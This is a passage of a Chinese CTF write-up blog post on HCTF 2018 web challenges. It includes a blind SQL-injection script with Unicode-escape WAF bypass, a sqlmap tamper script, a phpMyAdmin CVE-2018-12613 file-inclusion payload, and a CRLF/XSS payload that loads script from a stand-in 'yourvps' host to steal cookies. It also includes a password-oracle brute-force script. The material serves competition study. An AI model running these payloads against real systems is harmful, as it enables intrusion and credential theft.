 &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>问题出在json_decode会解编码，而过waf是在编码之前<br>所以我们可以用Unicode编码来过waf<br>上一个老大的板子(其实我康出来这是在晴晴的板子上改的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(msg.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/login.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url1 = url</span><br><span class="line">    payload = payload.replace(<span class="string">' '</span>, <span class="string">'/**/'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'if'</span>, <span class="string">'\\u0069f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'or'</span>, <span class="string">'o\\u0072'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'substr'</span>, <span class="string">'su\\u0062str'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\\u003e'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'='</span>, <span class="string">'\\u003d'</span>)</span><br><span class="line">    payload = <span class="string">'&#123;"admin_user":"%s"&#125;'</span> % payload</span><br><span class="line">    payload = parse.quote(payload)</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">"islogin"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"login_data"</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> requests.get(url1, cookies=cookies).headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">two</span><span class="params">(ind, cont, pos, result)</span>:</span></span><br><span class="line">    print(<span class="string">"[pos %d start]"</span> % pos)</span><br><span class="line">    payload = <span class="string">"' || if((ord(substr((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)='1"</span></span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        text = fuck(payload.format(cont, pos, mid))</span><br><span class="line">        <span class="keyword">if</span> len(text)==<span class="number">181</span>: <span class="comment"># True</span></span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">    result[pos] = chr(l)</span><br><span class="line">    print(<span class="string">"[pos %d end]"</span> % pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(cont)</span>:</span></span><br><span class="line">    print(<span class="string">"[Start]"</span>)</span><br><span class="line">    sz = <span class="number">60</span></span><br><span class="line">    res = [<span class="string">''</span>] * (sz + <span class="number">1</span>)</span><br><span class="line">    t = [<span class="keyword">None</span>] * sz</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, sz + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i &gt; sz:</span><br><span class="line">            t[i % sz].join()</span><br><span class="line">        t[i % sz] = threading.Thread(target=two, args=(i, cont, i, res))</span><br><span class="line">        t[i % sz].start()</span><br><span class="line">    <span class="keyword">for</span> th <span class="keyword">in</span> t:</span><br><span class="line">        th.join()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># db = sqli("SELECT database()")</span></span><br><span class="line"><span class="comment"># print(db)</span></span><br><span class="line"><span class="comment"># hctf_kouzone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tables = sqli("select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='hctf_kouzone'")</span></span><br><span class="line"><span class="comment"># print(tables)</span></span><br><span class="line"><span class="comment"># F1444g,fish_admin,fish_ip,fish_user,fish_user_fake</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cols = sqli("select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='F1444g'")</span></span><br><span class="line"><span class="comment"># print(cols)</span></span><br><span class="line"><span class="comment"># F1a9</span></span><br><span class="line"></span><br><span class="line">flag = sqli(<span class="string">"select group_concat(F1a9) from F1444g"</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后看到了一个写tamper的姿势，一并记录下来<br><a href="https://xz.aliyun.com/t/3245#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3245#toc-4</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    data = <span class="string">'''&#123;"admin_user":"%s"&#125;;'''</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">'u'</span>, <span class="string">'\u0075'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'o'</span>, <span class="string">'\u006f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'i'</span>, <span class="string">'\u0069'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\''</span>, <span class="string">'\u0027'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\"'</span>, <span class="string">'\u0022'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">' '</span>, <span class="string">'\u0020'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'s'</span>, <span class="string">'\u0073'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'#'</span>, <span class="string">'\u0023'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\u003e'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'\u003c'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'-'</span>, <span class="string">'\u002d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'='</span>, <span class="string">'\u003d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1a9'</span>, <span class="string">'F1a9'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1'</span>, <span class="string">'F1'</span>)</span><br><span class="line">    <span class="keyword">return</span> data % payload</span><br></pre></td></tr></table></figure></p>
+<p>无奈最后没能用tamper复现成功<br>还看到直接硬过了waf的神仙<br>用mysql.innodb_table_stats来查数据库名表名这种骚操作，然后用*代替列，想起来上次护网杯那道题，好像也能这么注<br>不复现了，最近比赛太多  </p>
+<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>签到题<br>F12有个source.php<br>简单搜索下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-12613 PhpMyadmin后台文件包含漏洞</span><br></pre></td></tr></table></figure></p>
+<p>直接上payload<br><code>http://warmup.2018.hctf.io/index.php?file=hint.php?/../../../../../../../../ffffllllaaaagggg</code></p>
+<h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>p总博客上有(好吧我没认真看过<br><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a><br>这题好像开始要绕csp，但是后来好像有点问题就改题了<br>只需要绕过302就行了<br>绕302，利用xss打cookie<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/cookie.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p>
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>/user.php?order=password该接口的order参数可指定当前页面输出的用户信息的排序字段。<br>大概就是order by password就行，根据返回的用户顺序去猜admin的密码<br>然后写脚本就成了<br>（放一个叶姐姐的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VALID_IDENT = string.ascii_letters + string.digits</span><br><span class="line">PASSLEN = <span class="number">32</span></span><br><span class="line">CRTAB6 = <span class="string">'\n'</span> + <span class="string">'\t'</span> * <span class="number">6</span></span><br><span class="line">CRTAB7 = <span class="string">'&lt;td&gt;\n'</span> + <span class="string">'\t'</span> * <span class="number">7</span></span><br><span class="line">ADMIN = <span class="string">f'<span class="subst">&#123;CRTAB7&#125;</span>1<span class="subst">&#123;CRTAB6&#125;</span>&lt;/td&gt;<span class="subst">&#123;CRTAB6&#125;</span><span class="subst">&#123;CRTAB7&#125;</span>admin<span class="subst">&#123;CRTAB6&#125;</span>&lt;/td&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(length, charset=VALID_IDENT)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(charset) <span class="keyword">for</span> n <span class="keyword">in</span> range(length)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getuser</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'xris_'</span> + randstr(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    URL = <span class="string">'http://game.2018.hctf.io/web2/action.php?action=reg'</span></span><br><span class="line">    OK = <span class="string">"&lt;script&gt;alert('success');location.href='index.html';&lt;/script&gt;"</span></span><br><span class="line">    form = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'sex'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">'submit'</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.post(URL, data=form)</span><br><span class="line">    <span class="keyword">if</span> resp.text != OK:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f'register failed with <span class="subst">&#123;resp.text&#125;</span>, <span class="subst">&#123;password&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    URL = <span class="string">'http://game.2018.hctf.io/web2/action.php?action=login'</span></span><br><span class="line">    OK = <span class="string">"&lt;script&gt;alert('success');location.href='user.php';&lt;/script&gt;"</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    form = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">'submit'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(URL, data=form)</span><br><span class="line">    <span class="keyword">if</span> resp.text != OK:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f'login failed with <span class="subst">&#123;resp.text&#125;</span>, <span class="subst">&#123;password&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_bytes</span><span class="params">(value, length)</span>:</span></span><br><span class="line">    retn = bytearray()</span><br><span class="line">    <span class="keyword">while</span> value:</span><br><span class="line">        retn.append(value % <span class="number">128</span>)</span><br><span class="line">        value //= <span class="number">128</span></span><br><span class="line">    retn.reverse()</span><br><span class="line">    <span class="keyword">return</span> retn.ljust(length).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(m)</span>:</span></span><br><span class="line">    URL = <span class="string">'http://game.2018.hctf.io/web2/user.php?order=password'</span></span><br><span class="line">    username = getuser()</span><br><span class="line">    password = to_bytes(m, PASSLEN)</span><br><span class="line">    register(username, password)</span><br><span class="line">    sess = login(username, password)</span><br><span class="line">    resp = sess.get(URL)</span><br><span class="line">    adloc = resp.text.find(ADMIN)</span><br><span class="line">    mytag = <span class="string">f'<span class="subst">&#123;CRTAB7&#125;</span><span class="subst">&#123;username&#125;</span><span class="subst">&#123;CRTAB6&#125;</span>'</span></span><br><span class="line">    myloc = resp.text.find(mytag)</span><br><span class="line">    <span class="keyword">if</span> adloc == <span class="number">-1</span> <span class="keyword">or</span> myloc == <span class="number">-1</span>:</span><br><span class="line">        <span class="comment"># Should never happen</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'not found with &#123;password&#125;'</span>)</span><br><span class="line">    <span class="keyword">return</span> myloc &lt; adloc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsearch</span><span class="params">(lower, upper, check)</span>:</span></span><br><span class="line">    bound = [lower, upper]</span><br><span class="line">    <span class="keyword">while</span> bound[<span class="number">0</span>] + <span class="number">1</span> != bound[<span class="number">1</span>]:</span><br><span class="line">        m = bound[<span class="number">0</span>] + bound[<span class="number">1</span>] &gt;&gt; <span class="number">1</span></span><br><span class="line">        bound[check(m)] = m</span><br><span class="line">        print(repr(to_bytes(m, <span class="number">0</span>)))</span><br><span class="line">    <span class="keyword">return</span> bound[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(bsearch(<span class="number">0</span>, <span class="number">128</span> ** PASSLEN, check))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># DSA8&amp;&amp;!@#$%^&amp;D1NGY1AS3DJA</span></span><br></pre></td></tr></table></figure></p>
+<p>order 参数可以传入 password, 二分 admin 密码.<br>虽然 MySQL 里比较运算符不区分大小写 (而且不能用 order by binary password 或 order by ascii(password), 被禁了). 不过最后输入 admin 密码的时候也不区分大小写.</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">N0rth3ty</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/11/12/HCTF-WEB部分题解/">http://yoursite.com/2018/11/12/HCTF-WEB部分题解/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/11/12/HCTF-WEB部分题解/">November 12th 2018, 9:21:23 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/11/12/HCTF-WEB部分题解/">November 12th 2018, 9:21:55 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/14/phpphar协议对象注入/" title= "phpphar协议对象注入">
+                    <div class="nextTitle">phpphar协议对象注入</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/12/上海大学生信息安全竞赛Web题解/" title= "上海大学生信息安全竞赛Web题解">
+                    <div class="prevTitle">上海大学生信息安全竞赛Web题解</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:northbhat@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/northity" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">1.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-number">2.</span> <span class="toc-text">admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kzone"><span class="toc-number">3.</span> <span class="toc-text">kzone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-number">4.</span> <span class="toc-text">Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bottle"><span class="toc-number">5.</span> <span class="toc-text">bottle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-number">6.</span> <span class="toc-text">game</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 35
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2019/03/02/Sql注入手册/" >Sql注入手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/2019/01/29/前端安全笔记/" >前端安全笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/2019/01/17/JSONP劫持/" >JSONP劫持</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2018/12/27/SWPUCTF复现/" >SWPUCTF复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/BCTF-Web签到/" >BCTF Web签到</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/Docker入门笔记/" >Docker入门笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2018/11/22/PHP反序列化补充/" >PHP反序列化补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/从LCTF-WEB签到题看PHP反序列化/" >从LCTF WEB签到题看PHP反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/phpphar协议对象注入/" >phpphar协议对象注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
